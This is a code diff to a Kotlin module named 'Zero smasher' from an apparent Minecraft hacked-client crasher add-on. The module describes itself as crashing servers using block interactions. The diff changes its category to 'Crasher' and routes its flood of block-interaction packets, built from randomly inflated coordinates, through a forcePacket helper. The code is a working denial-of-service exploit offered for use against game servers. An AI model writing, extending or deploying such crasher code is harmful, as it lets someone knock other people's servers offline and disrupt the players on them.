@@ -1,5 +1,6 @@
 package de.florianmichael.tarasande_crasher.module
 
+import de.florianmichael.tarasande_crasher.forcePacket
 import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket
 import net.minecraft.util.Hand
 import net.minecraft.util.hit.BlockHitResult
@@ -12,13 +13,11 @@ import net.tarasandedevelopment.tarasande.mc
 import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueMode
 import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueNumber
 import net.tarasandedevelopment.tarasande.system.feature.modulesystem.Module
-import net.tarasandedevelopment.tarasande.system.feature.modulesystem.ModuleCategory
-import net.tarasandedevelopment.tarasande.util.extension.javaruntime.Thread
 import net.tarasandedevelopment.tarasande.util.math.TimeUtil
 import net.tarasandedevelopment.tarasande.util.string.StringUtil
 import java.util.concurrent.ThreadLocalRandom
 
-class ModuleZeroSmasher : Module("Zero smasher", "Crashes the server using block interactions", ModuleCategory.EXPLOIT) {
+class ModuleZeroSmasher : Module("Zero smasher", "Crashes the server using block interactions", "Crasher") {
 
     private val hand = ValueMode(this, "Hand", false, *Hand.values().map { StringUtil.formatEnumTypes(it.name) }.toTypedArray())
     private val randomMultiply = ValueNumber(this, "Random multiply", 1000.0, 30000.0, 1000000.0, 1000.0)
@@ -34,7 +33,7 @@ class ModuleZeroSmasher : Module("Zero smasher", "Crashes the server using block
             if (it.state == EventUpdate.State.POST) {
                 if (timer.hasReached(delay.value.toLong())) {
                     if (mc.player!!.inventory.mainHandStack != null) {
-                        mc.networkHandler!!.sendPacket(
+                        forcePacket(
                             PlayerInteractBlockC2SPacket(
                                 if (hand.isSelected(0)) Hand.MAIN_HAND else Hand.OFF_HAND, BlockHitResult(
                                     Vec3d(
